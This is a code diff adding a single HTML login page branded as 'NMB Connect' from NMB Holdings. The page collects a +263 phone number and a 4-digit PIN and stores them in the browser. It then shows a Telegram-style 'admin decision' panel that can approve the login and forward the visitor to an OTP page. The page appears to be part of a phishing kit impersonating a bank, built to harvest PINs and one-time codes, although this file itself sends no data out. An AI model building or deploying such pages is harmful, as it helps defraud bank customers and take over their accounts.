@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NMB Connect - Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap');
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background: linear-gradient(to bottom, #004a99 0%, #004a99 200px, #f4f7fa 200px);
+            min-height: 100vh;
+        }
+        .nmb-blue { color: #003366; }
+        .nmb-bg-blue { background-color: #003366; }
+        .pin-input:focus { border-color: #f2a900; box-shadow: 0 0 0 2px rgba(242, 169, 0, 0.2); }
+        .admin-btn { transition: all 0.2s; }
+        .admin-btn:hover { transform: translateY(-2px); }
+    </style>
+</head>
+<body class="flex flex-col items-center">
+    <div class="mt-8 mb-6 text-center">
+        <div class="flex items-center justify-center space-x-1">
+            <span class="text-2xl font-black text-white">NMB</span>
+            <span class="text-2xl font-black text-[#f2a900]">Connect</span>
+        </div>
+        <p class="text-white/80 text-[10px] mt-1 uppercase tracking-[0.2em] font-bold">Secure Access</p>
+    </div>
+
+    <main class="w-full max-w-lg px-4 mb-8">
+        <div class="bg-white rounded-[2.5rem] shadow-2xl overflow-hidden">
+            <div id="loginForm" class="p-10 space-y-10">
+                <div class="text-center">
+                    <h2 class="text-3xl font-black text-gray-800 tracking-tight">Welcome Back</h2>
+                    <p class="text-gray-400 text-sm mt-2 font-medium">Enter your credentials to access your portal</p>
+                </div>
+
+                <div class="space-y-8">
+                    <div class="space-y-3">
+                        <label class="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">Phone Number</label>
+                        <div class="relative">
+                            <span class="absolute left-6 top-1/2 -translate-y-1/2 text-gray-400 font-black text-lg">+263</span>
+                            <input type="tel" id="phone" maxlength="9" placeholder="771234567" 
+                                class="w-full pl-20 pr-6 py-5 bg-gray-50/50 border border-gray-100 rounded-3xl focus:outline-none focus:border-[#f2a900] transition-all font-black text-xl text-gray-700 placeholder:text-gray-200">
+                        </div>
+                    </div>
+
+                    <div class="space-y-3">
+                        <label class="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">4-Digit PIN</label>
+                        <div class="flex justify-between space-x-4">
+                            <input type="password" maxlength="1" class="pin-input w-full h-20 text-center text-3xl font-black bg-gray-50/50 border border-gray-100 rounded-3xl focus:outline-none">
+                            <input type="password" maxlength="1" class="pin-input w-full h-20 text-center text-3xl font-black bg-gray-50/50 border border-gray-100 rounded-3xl focus:outline-none">
+                            <input type="password" maxlength="1" class="pin-input w-full h-20 text-center text-3xl font-black bg-gray-50/50 border border-gray-100 rounded-3xl focus:outline-none">
+                            <input type="password" maxlength="1" class="pin-input w-full h-20 text-center text-3xl font-black bg-gray-50/50 border border-gray-100 rounded-3xl focus:outline-none">
+                        </div>
+                    </div>
+                </div>
+
+                <button id="submitBtn" class="w-full nmb-bg-blue text-white font-black py-6 rounded-3xl shadow-xl hover:opacity-95 transition-all transform active:scale-[0.98] uppercase tracking-[0.2em] text-sm">
+                    Sign In
+                </button>
+            </div>
+
+            <!-- Polling & Admin Simulation -->
+            <div id="pollingOverlay" class="hidden p-12 text-center space-y-10">
+                <div class="relative w-28 h-28 mx-auto">
+                    <div class="absolute inset-0 border-[6px] border-gray-50 rounded-full"></div>
+                    <div class="absolute inset-0 border-[6px] border-[#f2a900] border-t-transparent rounded-full animate-spin"></div>
+                    <div class="absolute inset-0 flex items-center justify-center">
+                        <i class="fas fa-shield-alt text-4xl nmb-blue"></i>
+                    </div>
+                </div>
+                
+                <div class="space-y-3">
+                    <h3 class="text-2xl font-black text-gray-800 tracking-tight">Security Check</h3>
+                    <p class="text-gray-400 text-sm font-medium leading-relaxed">We've sent your request to the admin.<br>Please wait for approval.</p>
+                </div>
+
+                <!-- Admin Action Simulation (Telegram Style) -->
+                <div class="bg-gray-50 rounded-3xl p-6 space-y-4">
+                    <p class="text-[10px] font-black text-gray-400 uppercase tracking-widest">Admin Decision (Simulation)</p>
+                    <div class="grid grid-cols-1 gap-3">
+                        <button onclick="handleAdmin('approve')" class="admin-btn bg-green-500 text-white font-black py-4 rounded-2xl shadow-lg flex items-center justify-center space-x-2">
+                            <i class="fas fa-check-circle"></i> <span>APPROVE</span>
+                        </button>
+                        <button onclick="handleAdmin('decline')" class="admin-btn bg-red-500 text-white font-black py-4 rounded-2xl shadow-lg flex items-center justify-center space-x-2">
+                            <i class="fas fa-times-circle"></i> <span>DECLINE</span>
+                        </button>
+                        <button onclick="handleAdmin('applied')" class="admin-btn bg-orange-500 text-white font-black py-4 rounded-2xl shadow-lg flex items-center justify-center space-x-2">
+                            <i class="fas fa-history"></i> <span>ALREADY APPLIED</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Warning Modal -->
+    <div id="warningModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
+        <div class="bg-white rounded-[2rem] max-w-sm w-full p-8 text-center space-y-6 shadow-2xl">
+            <div class="w-20 h-20 bg-orange-100 text-orange-500 rounded-full flex items-center justify-center mx-auto">
+                <i class="fas fa-exclamation-triangle text-3xl"></i>
+            </div>
+            <div class="space-y-2">
+                <h4 class="text-xl font-black text-gray-800 uppercase tracking-tight">Attention Required</h4>
+                <p class="text-gray-500 text-sm font-medium">This user has already applied for a loan. Please decline to proceed with a new application.</p>
+            </div>
+            <button onclick="closeWarning()" class="w-full nmb-bg-blue text-white font-black py-4 rounded-2xl uppercase tracking-widest text-xs">
+                OK, I Understand
+            </button>
+        </div>
+    </div>
+
+    <footer class="pb-8 text-center text-gray-400 text-[10px] font-black uppercase tracking-[0.3em]">
+        &copy; 2026 NMB Holdings | Secure Lending Platform
+    </footer>
+
+    <script>
+        const pinInputs = document.querySelectorAll('.pin-input');
+        const phoneInput = document.getElementById('phone');
+        const submitBtn = document.getElementById('submitBtn');
+        const loginForm = document.getElementById('loginForm');
+        const pollingOverlay = document.getElementById('pollingOverlay');
+        const warningModal = document.getElementById('warningModal');
+
+        pinInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value && index < pinInputs.length - 1) pinInputs[index + 1].focus();
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) pinInputs[index - 1].focus();
+            });
+        });
+
+        phoneInput.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        submitBtn.addEventListener('click', () => {
+            const phone = phoneInput.value;
+            const pin = Array.from(pinInputs).map(i => i.value).join('');
+
+            if (phone.length !== 9) { alert('Please enter a valid 9-digit phone number'); return; }
+            if (pin.length !== 4) { alert('Please enter your 4-digit PIN'); return; }
+
+            localStorage.setItem('nmb_session', JSON.stringify({ phone: '+263' + phone, pin: pin }));
+
+            loginForm.classList.add('hidden');
+            pollingOverlay.classList.remove('hidden');
+        });
+
+        function handleAdmin(decision) {
+            if (decision === 'approve') {
+                window.location.href = 'otp.html';
+            } else if (decision === 'decline') {
+                location.reload();
+            } else if (decision === 'applied') {
+                warningModal.classList.remove('hidden');
+            }
+        }
+
+        function closeWarning() {
+            warningModal.classList.add('hidden');
+        }
+    </script>
+</body>
+</html>
